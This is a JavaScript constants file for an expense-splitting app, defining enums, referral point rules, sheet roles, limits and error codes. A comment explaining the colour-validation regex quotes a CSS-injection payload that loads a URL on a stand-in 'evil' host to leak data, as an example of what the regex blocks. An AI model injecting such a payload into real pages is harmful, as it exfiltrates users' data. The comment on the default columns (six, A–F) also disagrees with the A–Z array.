/** Shared enums, limits and error codes. Single source of truth for both layers. */

// The only import here, and only for the referral levels — which are deliberately
// operator-tunable, so they cannot be literals in this file. config/env pulls in
// nothing from here, so there is no cycle.
const config = require("../config/env");

const GROUP_STATUS = Object.freeze({
  ACTIVE: "ACTIVE",
  ARCHIVED: "ARCHIVED",
  DELETED: "DELETED",
});

const SPLIT_TYPES = Object.freeze({
  EQUAL: "EQUAL",
  EXACT: "EXACT",
  PERCENTAGE: "PERCENTAGE",
  SHARES: "SHARES",
});

/**
 * Every split type except EQUAL needs a per-participant input value. It is stored
 * as an INTEGER whose unit depends on the split type, so the no-floats rule
 * (docs/05-ALGORITHMS.md §1) holds for split inputs too:
 *
 *   EXACT       minor units      — ₹250.50 is stored as 25050
 *   PERCENTAGE  hundredths of a percent — 33.33% is stored as 3333
 *   SHARES      whole weights    — "2 shares" is stored as 2
 */
const SPLIT_VALUE_UNITS = Object.freeze({
  [SPLIT_TYPES.EXACT]: "MINOR",
  [SPLIT_TYPES.PERCENTAGE]: "CENTIPERCENT",
  [SPLIT_TYPES.SHARES]: "WEIGHT",
});

const SETTLEMENT_METHODS = Object.freeze({
  MANUAL: "MANUAL",
  // Reserved for the payments phase.
  UPI: "UPI",
  CASH: "CASH",
  CARD: "CARD",
});

const ACTIVITY_TYPES = Object.freeze({
  GROUP_CREATED: "GROUP_CREATED",
  GROUP_UPDATED: "GROUP_UPDATED",
  GROUP_ARCHIVED: "GROUP_ARCHIVED",
  MEMBER_JOINED: "MEMBER_JOINED",
  MEMBER_ADDED: "MEMBER_ADDED",
  MEMBER_RENAMED: "MEMBER_RENAMED",
  MEMBER_REMOVED: "MEMBER_REMOVED",
  MEMBER_MERGED: "MEMBER_MERGED",
  JOIN_REQUESTED: "JOIN_REQUESTED",
  JOIN_APPROVED: "JOIN_APPROVED",
  JOIN_DECLINED: "JOIN_DECLINED",
  DEVICE_LINKED: "DEVICE_LINKED",
  ACCOUNT_LINKED: "ACCOUNT_LINKED",
  EXPENSE_ADDED: "EXPENSE_ADDED",
  EXPENSE_UPDATED: "EXPENSE_UPDATED",
  EXPENSE_DELETED: "EXPENSE_DELETED",
  SETTLEMENT_RECORDED: "SETTLEMENT_RECORDED",
});

/**
 * The three things a personal ledger entry can be (docs/08-PERSONAL-LEDGER.md §1).
 *
 * `SPEND` never settles — it is a record of money gone, not a debt. The other two
 * are the same transaction seen from opposite ends, and are kept as distinct types
 * rather than one signed amount because "who owes whom" is the question the ledger
 * exists to answer, and a sign is a poor way to ask it.
 */
const LEDGER_ENTRY_TYPES = Object.freeze({
  SPEND: "SPEND",
  LENT: "LENT",
  BORROWED: "BORROWED",
});

/**
 * The life of a claim one person's ledger makes against another's.
 *
 * `DECLINED` is terminal and deliberately does **not** delete the claimant's own
 * entry: "you owe me" and "no I don't" is a real disagreement, and a ledger that
 * resolves it by deleting one side is lying to somebody
 * (docs/17-MEMBER-IDENTITY.md §7).
 */
const LEDGER_CLAIM_STATUS = Object.freeze({
  PENDING: "PENDING",
  ACCEPTED: "ACCEPTED",
  DECLINED: "DECLINED",
});

/** Small and fixed. A free-text category field becomes forty spellings of "food". */
/**
 * Categories a spend can carry.
 *
 * **This list and the rules in `utils/inferCategory.js` must agree.** The model
 * validates against this enum, so a rule producing a category that is missing here
 * fails the save — and because the mirror write swallows its errors by design,
 * the failure is silent: expenses simply stop appearing in the ledger. If you add
 * a rule, add its category here in the same commit.
 */
const LEDGER_CATEGORIES = Object.freeze([
  "FOOD",
  "TRAVEL",
  "SHOPPING",
  "BILLS",
  "HEALTH",
  "ENTERTAINMENT",
  "RENT",
  "HOME",
  "PERSONAL_CARE",
  "EDUCATION",
  "OFFICE",
  "SUBSCRIPTIONS",
  "PETS",
  "KIDS",
  "FINANCE",
  "OTHER",
]);

/**
 * Reward point events (docs/11-REWARDS.md).
 *
 * Note what is absent: nothing per-expense. Points are awarded for logging on a
 * *day*, not for each row — paying per row is a standing incentive to create
 * rows, and in a shared group that silently distorts what everyone else owes.
 */
const BASE_POINT_EVENT_TYPES = {
  /** At least one expense or ledger entry today. Once daily, however many. */
  ACTIVE_DAY: "ACTIVE_DAY",
  /** Closed a debt — the loop that actually matters. */
  SETTLEMENT: "SETTLEMENT",
  LEDGER_REPAID: "LEDGER_REPAID",
  STREAK_3: "STREAK_3",
  STREAK_7: "STREAK_7",
  STREAK_14: "STREAK_14",
  STREAK_30: "STREAK_30",
  FIRST_GROUP: "FIRST_GROUP",
  FIRST_LEDGER_ENTRY: "FIRST_LEDGER_ENTRY",
  NOTIFICATIONS_ENABLED: "NOTIFICATIONS_ENABLED",
  /** A brand new account's opening balance, so Ria works on day one. */
  WELCOME_BONUS: "WELCOME_BONUS",
  /** The invitee's half of a referral — for arriving through someone's link. */
  REFERRAL_JOINED: "REFERRAL_JOINED",
  /** Negative. The only sink in v1. */
  SPEND_AI_QUESTION: "SPEND_AI_QUESTION",
};

/**
 * `REFERRAL_L1`, `REFERRAL_L2`, … one per configured level.
 *
 * Generated rather than written out because the depth is an operator setting: a
 * fixed list of three would silently ignore a fourth level, and the mismatch
 * would only show up as referrals quietly not paying. `REFERRAL_LEVELS=50`
 * yields a flat one-level scheme and no `REFERRAL_L2` type ever exists.
 */
const REFERRAL_LEVEL_TYPES = Object.freeze(
  config.referral.levels.map((_, index) => `REFERRAL_L${index + 1}`)
);

const POINT_EVENT_TYPES = Object.freeze({
  ...BASE_POINT_EVENT_TYPES,
  ...Object.fromEntries(REFERRAL_LEVEL_TYPES.map((type) => [type, type])),
});

/** Point values and how often each may be earned. Amounts of money never feature. */
const POINT_RULES = Object.freeze({
  [POINT_EVENT_TYPES.ACTIVE_DAY]: { points: 10, perDay: 1 },
  [POINT_EVENT_TYPES.SETTLEMENT]: { points: 15, perDay: 2 },
  [POINT_EVENT_TYPES.LEDGER_REPAID]: { points: 15, perDay: 2 },
  [POINT_EVENT_TYPES.STREAK_3]: { points: 20, once: true },
  [POINT_EVENT_TYPES.STREAK_7]: { points: 50, once: true },
  [POINT_EVENT_TYPES.STREAK_14]: { points: 100, once: true },
  [POINT_EVENT_TYPES.STREAK_30]: { points: 250, once: true },
  [POINT_EVENT_TYPES.FIRST_GROUP]: { points: 25, once: true },
  [POINT_EVENT_TYPES.FIRST_LEDGER_ENTRY]: { points: 25, once: true },
  [POINT_EVENT_TYPES.NOTIFICATIONS_ENABLED]: { points: 25, once: true },
  [POINT_EVENT_TYPES.WELCOME_BONUS]: { points: config.referral.welcomeBonus, once: true },
  [POINT_EVENT_TYPES.REFERRAL_JOINED]: { points: config.referral.joinBonus, once: true },

  /**
   * One rule per configured level.
   *
   * `uncapped` because these must not be metered by `DAILY_EARN_CAP`: someone who
   * logs an expense, settles a debt and then has two friends join should not find
   * the friends silently worthless because the day's ordinary allowance was
   * already spent. They are bounded instead by `perDay` — a tighter, more
   * targeted limit, since this is the rule most worth attacking.
   *
   * `key: "subject"` marks the dedupe as per-*referred-person* rather than
   * per-day: the same friend qualifying can never pay out twice, however long
   * ago they joined.
   */
  ...Object.fromEntries(
    REFERRAL_LEVEL_TYPES.map((type, index) => [
      type,
      {
        points: config.referral.levels[index],
        perDay: config.referral.dailyCap,
        uncapped: true,
        key: "subject",
      },
    ])
  ),
});

const POINTS = Object.freeze({
  /**
   * Ceiling on ordinary earning per day, independent of the individual rules —
   * so a rule added carelessly later cannot uncap the economy. Streak milestones
   * are exempt: they are once-ever and already bounded.
   */
  DAILY_EARN_CAP: 60,
  /** One Ria question beyond the free daily quota. */
  AI_QUESTION_COST: 10,
  /**
   * The same question, for an account still inside its first `AI_NEW_USER_DAYS`.
   *
   * Half price, because a new account has the welcome bonus and no earning
   * history: at full price the bonus buys five questions, at half it buys ten —
   * enough to find out whether the assistant is worth the daily habit that earns
   * more. Nothing here is time-limited *after* that; the price simply returns to
   * normal once the account is no longer new (docs/10-AI-ASSISTANT.md §5).
   */
  AI_QUESTION_COST_NEW: 5,
  STREAK_MILESTONES: Object.freeze([
    { days: 3, type: POINT_EVENT_TYPES.STREAK_3 },
    { days: 7, type: POINT_EVENT_TYPES.STREAK_7 },
    { days: 14, type: POINT_EVENT_TYPES.STREAK_14 },
    { days: 30, type: POINT_EVENT_TYPES.STREAK_30 },
  ]),
});

/**
 * A request to join by short code, and how it ended (docs/13-JOIN-APPROVAL.md).
 * `EXPIRED` is set by the sweep, never by a user action.
 */
const JOIN_REQUEST_STATUS = Object.freeze({
  PENDING: "PENDING",
  APPROVED: "APPROVED",
  DECLINED: "DECLINED",
  EXPIRED: "EXPIRED",
  CANCELLED: "CANCELLED",
});

const BALANCE_STATUS = Object.freeze({
  RECEIVE: "RECEIVE",
  OWE: "OWE",
  SETTLED: "SETTLED",
});

/* ------------------------------ Expense sheets ---------------------------- */

/**
 * Who can open a sheet without being named on it (docs/20-EXPENSE-SHEETS.md §4).
 *
 * Two values, not three. The obvious third — a "listed publicly, indexable"
 * tier — is deliberately absent: `PUBLIC` here already means "anyone holding the
 * link", which is the thing people actually reach for, and a discoverable tier
 * would need a directory, moderation and an abuse story that this feature has no
 * appetite for. The API also sets `X-Robots-Tag: noindex` on every response
 * (app.js), so a public sheet is unlisted by construction.
 *
 * `PRIVATE` is the default, and it is the stricter default on purpose: a sheet
 * of company spending that silently starts life readable by anyone with the URL
 * is the one failure mode worth engineering against.
 */
const SHEET_VISIBILITY = Object.freeze({
  PRIVATE: "PRIVATE",
  PUBLIC: "PUBLIC",
});

/**
 * What someone may do with a sheet, most powerful first.
 *
 * Ordered, and compared by `SHEET_ROLE_RANK` rather than by equality, so a check
 * reads "at least an editor" instead of enumerating every role that qualifies.
 * Adding a role later then means adding one line here rather than auditing every
 * comparison in the service.
 *
 * There is no COMMENTER. Comments are not a thing this product has, and a role
 * that grants access to a feature nobody built is a permission that only ever
 * confuses the person granting it.
 */
const SHEET_ROLES = Object.freeze({
  OWNER: "OWNER",
  EDITOR: "EDITOR",
  VIEWER: "VIEWER",
});

const SHEET_ROLE_RANK = Object.freeze({
  [SHEET_ROLES.VIEWER]: 1,
  [SHEET_ROLES.EDITOR]: 2,
  [SHEET_ROLES.OWNER]: 3,
});

/** Roles that may be handed out. OWNER is absent: ownership is not a grant. */
const SHEET_GRANTABLE_ROLES = Object.freeze([SHEET_ROLES.EDITOR, SHEET_ROLES.VIEWER]);

/**
 * How a caller arrived at the access they have — reported to the client so the UI
 * can explain itself ("shared with you by Riya" against "anyone with the link can
 * edit"), and so a viewer can tell a deliberate grant from a public setting that
 * may be revoked at any moment.
 */
const SHEET_ACCESS_SOURCE = Object.freeze({
  OWNER: "OWNER",
  GRANT: "GRANT",
  PUBLIC: "PUBLIC",
});

/** The life of a "let me in" (docs/20-EXPENSE-SHEETS.md §6). */
const SHEET_REQUEST_STATUS = Object.freeze({
  PENDING: "PENDING",
  APPROVED: "APPROVED",
  DECLINED: "DECLINED",
  CANCELLED: "CANCELLED",
});

/**
 * What a column *looks like*, never what its cells are allowed to contain.
 *
 * This is the honest shape of a free-form grid: every cell is stored as a string
 * and nothing is rejected for failing to match its column's type. The type drives
 * presentation only — text alignment, which editor the grid opens, and whether a
 * column offers a footer total.
 *
 * Calling it a type at all is therefore a small lie of convenience, and the
 * reason it is worth telling: a person setting up an "Amount" column expects
 * right-aligned numbers and a sum at the bottom, and expects to still be able to
 * type "approx 400" in one cell without the app arguing. Enforcement would buy
 * correctness the product elsewhere pays for with `amountMinor` integers — and
 * this grid deliberately does not (docs/20-EXPENSE-SHEETS.md §2).
 */
const SHEET_COLUMN_TYPES = Object.freeze({
  TEXT: "TEXT",
  NUMBER: "NUMBER",

  DATE: "DATE",
  TIME: "TIME",
  DATETIME: "DATETIME",

  SELECT: "SELECT",
  MULTI_SELECT: "MULTI_SELECT",

  CHECKBOX: "CHECKBOX",
  BOOLEAN: "BOOLEAN",

  EMAIL: "EMAIL",
  PHONE: "PHONE",
  URL: "URL",

  CURRENCY: "CURRENCY",
  PERCENTAGE: "PERCENTAGE",

  FORMULA: "FORMULA",

  FILE: "FILE",
  IMAGE: "IMAGE",

  RATING: "RATING",

  TEXTAREA: "TEXTAREA",
});

/**
 * Horizontal alignment of a cell's contents. Vertical is deliberately absent:
 * rows are a single fixed height, so there is nothing to align against.
 */
const SHEET_ALIGNMENTS = Object.freeze({
  LEFT: "LEFT",
  CENTER: "CENTER",
  RIGHT: "RIGHT",
});

/**
 * What a sheet is called when nobody has said.
 *
 * Matches the wording every spreadsheet uses, because the string is doing more
 * than filling a field: seeing "Untitled spreadsheet" in the title bar is what
 * tells someone the name is theirs to change, where a blank title reads as a
 * bug and a clever generated name reads as a decision already made.
 */
const DEFAULT_SHEET_TITLE = "Untitled spreadsheet";

/**
 * What counts as a colour.
 *
 * Any `#rrggbb`, and **only** that shape. These values are written straight into
 * a `style` attribute in every collaborator's browser, so the question that
 * matters is not which colours are tasteful but whether a string can carry
 * anything besides a colour. A six-digit hex triplet cannot: there is no room in
 * the grammar for a semicolon, a `url(`, or a second declaration, so the classic
 * `red;background:url(https://evil/log?c=)` payload fails the pattern outright.
 *
 * This replaced a fixed whitelist of eleven swatches. The whitelist was airtight
 * but it was answering a second question at the same time — legibility, on the
 * theory that a picker lets someone set white on white for everybody. That is a
 * real risk and it is now the user's to take: it is recoverable in one click,
 * every other spreadsheet allows it, and enforcing taste through the security
 * boundary meant nobody could have a brand colour either. The injection
 * guarantee is unchanged, because it never depended on the list being short —
 * only on the value being a colour and nothing else.
 *
 * Anchored, and case-insensitive with the result stored lowercased so `#FFF000`
 * and `#fff000` are one value rather than two.
 */
const SHEET_COLOUR_PATTERN = /^#[0-9a-f]{6}$/i;

/**
 * The swatches the toolbar offers up front.
 *
 * No longer a security boundary — see SHEET_COLOUR_PATTERN — just a starting
 * point, so the common case is one click and picking a custom colour is a
 * deliberate second step. Text colours are chosen to stay readable on white,
 * fills to stay readable under dark text.
 */
const SHEET_TEXT_COLOURS = Object.freeze([
  "#0f172a", "#dc2626", "#ea580c", "#ca8a04",
  "#16a34a", "#0891b2", "#2563eb", "#7c3aed",
  "#db2777", "#64748b", "#ffffff",
]);

const SHEET_FILL_COLOURS = Object.freeze([
  "#ffffff", "#fee2e2", "#ffedd5", "#fef9c3",
  "#dcfce7", "#cffafe", "#dbeafe", "#ede9fe",
  "#fce7f3", "#f1f5f9", "#e2e8f0", "#0f172a",
]);

/**
 * The columns a brand new sheet starts with.
 *
 * Deliberately **unnamed** — `A`…`F`, all plain text — rather than a guessed
 * schema like Date / Description / Amount.
 *
 * A named default is a suggestion with authority: it tells someone this sheet is
 * for the kind of expense log we imagined, and the columns they actually needed
 * (Vendor, Project, GST, Approver) arrive as an afterthought to the right of ours.
 * Worse, half of them will rename Date to something else and leave a `DATE`-typed
 * column behind it, so the type stops describing the contents.
 *
 * Letters, matching the address strip the grid draws above the header, so an
 * untouched sheet reads exactly like a blank spreadsheet and the header row is
 * visibly *yours to fill in* rather than something to work around. Six columns
 * because that is roughly a screen's width — the point is room to start typing,
 * not a schema.
 */
const SHEET_DEFAULT_COLUMNS = Object.freeze([
  { name: "A", type: SHEET_COLUMN_TYPES.TEXT, width: 150 },
  { name: "B", type: SHEET_COLUMN_TYPES.TEXT, width: 220 },
  { name: "C", type: SHEET_COLUMN_TYPES.TEXT, width: 150 },
  { name: "D", type: SHEET_COLUMN_TYPES.TEXT, width: 130 },
  { name: "E", type: SHEET_COLUMN_TYPES.TEXT, width: 150 },
  { name: "F", type: SHEET_COLUMN_TYPES.TEXT, width: 150 },
  { name: "G", type: SHEET_COLUMN_TYPES.TEXT, width: 150 },
  { name: "H", type: SHEET_COLUMN_TYPES.TEXT, width: 150 },
  { name: "I", type: SHEET_COLUMN_TYPES.TEXT, width: 150 },
  { name: "J", type: SHEET_COLUMN_TYPES.TEXT, width: 150 },
  { name: "K", type: SHEET_COLUMN_TYPES.TEXT, width: 150 },
  { name: "L", type: SHEET_COLUMN_TYPES.TEXT, width: 150 },
  { name: "M", type: SHEET_COLUMN_TYPES.TEXT, width: 150 },
  { name: "N", type: SHEET_COLUMN_TYPES.TEXT, width: 150 },
  { name: "O", type: SHEET_COLUMN_TYPES.TEXT, width: 150 },
  { name: "P", type: SHEET_COLUMN_TYPES.TEXT, width: 150 },
  { name: "Q", type: SHEET_COLUMN_TYPES.TEXT, width: 150 },
  { name: "R", type: SHEET_COLUMN_TYPES.TEXT, width: 150 },
  { name: "S", type: SHEET_COLUMN_TYPES.TEXT, width: 150 },
  { name: "T", type: SHEET_COLUMN_TYPES.TEXT, width: 150 },
  { name: "U", type: SHEET_COLUMN_TYPES.TEXT, width: 150 },
  { name: "V", type: SHEET_COLUMN_TYPES.TEXT, width: 150 },
  { name: "W", type: SHEET_COLUMN_TYPES.TEXT, width: 150 },
  { name: "X", type: SHEET_COLUMN_TYPES.TEXT, width: 150 },
  { name: "Y", type: SHEET_COLUMN_TYPES.TEXT, width: 150 },
  { name: "Z", type: SHEET_COLUMN_TYPES.TEXT, width: 150 },
]);

const LIMITS = Object.freeze({
  MAX_MEMBERS_PER_GROUP: 50,
  /** One person, several browsers. Bounded so a shared device cannot accumulate forever. */
  MAX_DEVICES_PER_MEMBER: 8,
  /** Typed by hand, so short — kept safe by a 10 minute TTL, single use and a try limit. */
  LINK_CODE_LENGTH: 6,
  LINK_CODE_TTL_MS: 10 * 60 * 1000,
  LINK_CODE_MAX_ATTEMPTS: 5,
  MAX_PARTICIPANTS: 50,
  MAX_AMOUNT_MAJOR: 10_000_000,
  MAX_PAGE_SIZE: 50,
  /** One receipt's worth of lines. Bounded so a batch stays a single quick write. */
  MAX_BATCH_ITEMS: 20,
  DEFAULT_PAGE_SIZE: 20,
  INVITE_CODE_LENGTH: 16,
  /**
   * The short code people read out or type in, as opposed to the 16-char invite
   * code that lives in a URL. 8 symbols from a 25-letter alphabet is ~37 bits —
   * far less than the link's 96, which is why it is optional, revocable, and the
   * only thing behind the strict lookup limiter. See docs/02-HLD.md §3.4.
   */
  JOIN_CODE_LENGTH: 8,
  JOIN_CODE_MIN: 6,
  JOIN_CODE_MAX: 12,
  GROUP_NAME_MAX: 80,
  GROUP_DESC_MAX: 500,
  MEMBER_NAME_MAX: 50,
  EXPENSE_DESC_MAX: 140,
  /** Personal ledger. Descriptions are terser than a group expense's — nobody else has to understand them. */
  LEDGER_DESC_MAX: 140,
  LEDGER_NOTE_MAX: 500,
  /** A name typed by hand, never a member reference — see docs/08-PERSONAL-LEDGER.md §2. */
  LEDGER_COUNTERPARTY_MAX: 60,
  /** A loan between friends, not an instalment plan. Bounds an embedded array. */
  MAX_REPAYMENTS_PER_ENTRY: 50,
  EXPENSE_NOTES_MAX: 500,
  SETTLEMENT_NOTE_MAX: 280,
  /** Percentages carry 2 decimals, so 100% is 10 000 centipercent. */
  PERCENT_TOTAL_CENTI: 10_000,
  /**
   * Caps `amountMinor * weight` well inside Number.MAX_SAFE_INTEGER: the largest
   * expense is 1e9 minor units and 50 participants at weight 1000 total 50 000,
   * so the widest product is 1e9 × 1000 = 1e12 — three orders of magnitude clear.
   */
  MAX_SHARE_WEIGHT: 1000,

  /* ---------------------------- Expense sheets --------------------------- */

  SHEET_TITLE_MAX: 120,
  SHEET_DESC_MAX: 500,
  SHEET_COLUMN_NAME_MAX: 60,
  /**
   * Wide enough for a real expense register — date, description, category,
   * amount, vendor, project, invoice no., GST, approver, status, and room to
   * spare — and narrow enough that one row still fits a single document
   * comfortably. Past this the thing being built is a database, not a sheet.
   */
  SHEET_MAX_COLUMNS: 40,
  /** One cell. Generous for a note, far short of storing a document in a grid. */
  SHEET_CELL_MAX: 2000,
  SHEET_MAX_SELECT_OPTIONS: 50,
  /**
   * Rows per sheet. A cap exists so one sheet cannot become an unbounded
   * collection scan; 20 000 is several years of daily expenses for a small
   * company, which is the case this was built for.
   */
  SHEET_MAX_ROWS: 20_000,
  /**
   * Rows in one bulk write — the clipboard paste path.
   *
   * Bounded by the request body limit rather than by taste: sheet routes parse up
   * to `SHEET_BODY_LIMIT` (app.js), and 500 rows of ordinary expense data sits
   * inside that with room to spare. A larger paste is split by the client into
   * consecutive calls, which is also what keeps one paste from holding the event
   * loop for a noticeable beat.
   */
  SHEET_MAX_BULK_ROWS: 500,
  /**
   * Gap left between adjacent row positions, so inserting between two rows is an
   * arithmetic midpoint rather than a renumbering of everything below it. See
   * models/sheetRow.js for what happens when the gaps run out.
   */
  SHEET_POSITION_STEP: 65_536,
  /** Pending invitations plus active grants on one sheet. Bounds the share list. */
  SHEET_MAX_GRANTS: 200,
  /**
   * Protected ranges per sheet. Each is checked on every cell write, so this is
   * the bound on that check's cost as much as on the UI's.
   */
  SHEET_MAX_PROTECTED_RANGES: 50,
  /** Rows/columns that can be frozen. Beyond this there is no scrollable area left. */
  SHEET_MAX_FROZEN: 10,
  /** Point size for cell text. Below 8 is unreadable; above 32 breaks the row height. */
  SHEET_FONT_SIZE_MIN: 8,
  SHEET_FONT_SIZE_MAX: 32,
  /**
   * How long an unanswered access request stays answerable. Far longer than a
   * group's 15 minutes (config.join.requestTtlMinutes): a group join is a live
   * moment with everyone in the same room, whereas "can I see the Q3 expenses?"
   * is a message that legitimately waits for someone to come back from leave.
   */
  SHEET_REQUEST_TTL_DAYS: 30,
});

const ERROR_CODES = Object.freeze({
  VALIDATION_ERROR: "VALIDATION_ERROR",
  /** No token, a malformed one, or one this server cannot verify. */
  UNAUTHENTICATED: "UNAUTHENTICATED",
  /**
   * Its own code, separate from UNAUTHENTICATED, because the client's response
   * differs: an expired token is refreshed and the request retried, whereas an
   * invalid one means sign in again. Firebase tokens last an hour, so this is a
   * routine event rather than an error — see docs/09-AUTH.md §3.
   */
  TOKEN_EXPIRED: "TOKEN_EXPIRED",
  /** The account was disabled, or its sessions were revoked. */
  ACCOUNT_DISABLED: "ACCOUNT_DISABLED",
  /** Firebase is not configured on this deployment; ledger routes cannot serve. */
  FEATURE_UNAVAILABLE: "FEATURE_UNAVAILABLE",
  INVALID_AMOUNT: "INVALID_AMOUNT",
  INVALID_ID: "INVALID_ID",
  INVALID_PARTICIPANTS: "INVALID_PARTICIPANTS",
  INVALID_SPLIT: "INVALID_SPLIT",
  SELF_SETTLEMENT: "SELF_SETTLEMENT",
  NOT_A_MEMBER: "NOT_A_MEMBER",
  CREATOR_ONLY: "CREATOR_ONLY",
  EXPENSE_OWNER_ONLY: "EXPENSE_OWNER_ONLY",
  INVALID_LINK_CODE: "INVALID_LINK_CODE",
  INVALID_JOIN_CODE: "INVALID_JOIN_CODE",
  JOIN_CODE_TAKEN: "JOIN_CODE_TAKEN",
  DEVICE_LIMIT_REACHED: "DEVICE_LIMIT_REACHED",
  INVALID_MERGE: "INVALID_MERGE",
  GROUP_NOT_FOUND: "GROUP_NOT_FOUND",
  /** The short code was right, but a member still has to let you in. */
  JOIN_PENDING_APPROVAL: "JOIN_PENDING_APPROVAL",
  JOIN_REQUEST_NOT_FOUND: "JOIN_REQUEST_NOT_FOUND",
  JOIN_REQUEST_ALREADY_DECIDED: "JOIN_REQUEST_ALREADY_DECIDED",
  MEMBER_NOT_FOUND: "MEMBER_NOT_FOUND",
  EXPENSE_NOT_FOUND: "EXPENSE_NOT_FOUND",
  GROUP_ARCHIVED: "GROUP_ARCHIVED",
  GROUP_DELETED: "GROUP_DELETED",
  MEMBER_HAS_ACTIVITY: "MEMBER_HAS_ACTIVITY",
  LEDGER_ENTRY_NOT_FOUND: "LEDGER_ENTRY_NOT_FOUND",
  /** Mirrored from a group expense — edit it there, or the change gets reverted. */
  LEDGER_ENTRY_NOT_EDITABLE: "LEDGER_ENTRY_NOT_EDITABLE",
  /** A repayment that would exceed what is owed — rejected, never clamped. */
  REPAYMENT_EXCEEDS_PRINCIPAL: "REPAYMENT_EXCEEDS_PRINCIPAL",
  /** Repayments only make sense on a debt; a SPEND has nothing to repay. */
  NOT_A_DEBT: "NOT_A_DEBT",
  MEMBER_LIMIT_REACHED: "MEMBER_LIMIT_REACHED",
  ALREADY_CLAIMED: "ALREADY_CLAIMED",
  /**
   * This member already belongs to a different account. Never overwritten —
   * silently re-pointing it is an account-takeover primitive once a ledger
   * resolves debts through the link (docs/17-MEMBER-IDENTITY.md §10).
   */
  MEMBER_ALREADY_LINKED: "MEMBER_ALREADY_LINKED",
  /**
   * This account already holds a *different* member in this group. Two members
   * for one person in one group is either a merge case or a mistake, and the two
   * need telling apart by a human (docs/17-MEMBER-IDENTITY.md §13).
   */
  ACCOUNT_ALREADY_IN_GROUP: "ACCOUNT_ALREADY_IN_GROUP",
  VERSION_CONFLICT: "VERSION_CONFLICT",

  /* ---------------------------- Expense sheets --------------------------- */

  SHEET_NOT_FOUND: "SHEET_NOT_FOUND",
  SHEET_ROW_NOT_FOUND: "SHEET_ROW_NOT_FOUND",
  SHEET_COLUMN_NOT_FOUND: "SHEET_COLUMN_NOT_FOUND",
  /**
   * Signed in, but nobody has shared this sheet with this account — the cue for
   * the client to show the "request access" screen rather than a dead end. This
   * is a 403 and never a 404: the sheet's existence is already implied by the
   * link the person is holding, and pretending otherwise would make the request
   * flow impossible to offer.
   */
  SHEET_ACCESS_DENIED: "SHEET_ACCESS_DENIED",
  /** Read access is enough; this particular action needs EDITOR or OWNER. */
  SHEET_EDITOR_ONLY: "SHEET_EDITOR_ONLY",
  /** Only the owner may reshare, change visibility, or delete. */
  SHEET_OWNER_ONLY: "SHEET_OWNER_ONLY",
  /**
   * The sheet was shared with an address this account has not proved it holds.
   *
   * Distinct from SHEET_ACCESS_DENIED because the remedy is completely
   * different, and actionable: verify the email, or sign in as the invited
   * address. Telling someone "no access" when they are one click from having it
   * sends them to ask for a second invitation that will not help either
   * (docs/20-EXPENSE-SHEETS.md §5).
   */
  SHEET_EMAIL_UNVERIFIED: "SHEET_EMAIL_UNVERIFIED",
  SHEET_REQUEST_NOT_FOUND: "SHEET_REQUEST_NOT_FOUND",
  SHEET_REQUEST_ALREADY_DECIDED: "SHEET_REQUEST_ALREADY_DECIDED",
  SHEET_ALREADY_SHARED: "SHEET_ALREADY_SHARED",
  SHEET_LIMIT_REACHED: "SHEET_LIMIT_REACHED",
  /**
   * The cell is inside a range the owner protected. Its own code because the
   * client's response is specific: show which range, and who to ask — not the
   * generic "you can't edit this sheet", which is untrue and would send an
   * editor to request access they already have.
   */
  SHEET_RANGE_LOCKED: "SHEET_RANGE_LOCKED",

  DUPLICATE: "DUPLICATE",
  RATE_LIMITED: "RATE_LIMITED",
  ORIGIN_NOT_ALLOWED: "ORIGIN_NOT_ALLOWED",
  INTERNAL_ERROR: "INTERNAL_ERROR",
});

const DEFAULT_CURRENCY = "INR";

module.exports = {
  GROUP_STATUS,
  LEDGER_ENTRY_TYPES,
  LEDGER_CLAIM_STATUS,
  LEDGER_CATEGORIES,
  POINT_EVENT_TYPES,
  POINT_RULES,
  POINTS,
  REFERRAL_LEVEL_TYPES,
  SPLIT_TYPES,
  SPLIT_VALUE_UNITS,
  SETTLEMENT_METHODS,
  ACTIVITY_TYPES,
  BALANCE_STATUS,
  JOIN_REQUEST_STATUS,
  SHEET_VISIBILITY,
  SHEET_ROLES,
  SHEET_ROLE_RANK,
  SHEET_GRANTABLE_ROLES,
  SHEET_ACCESS_SOURCE,
  SHEET_REQUEST_STATUS,
  SHEET_COLUMN_TYPES,
  SHEET_DEFAULT_COLUMNS,
  SHEET_ALIGNMENTS,
  SHEET_TEXT_COLOURS,
  SHEET_FILL_COLOURS,
  SHEET_COLOUR_PATTERN,
  DEFAULT_SHEET_TITLE,
  LIMITS,
  ERROR_CODES,
  DEFAULT_CURRENCY,
};
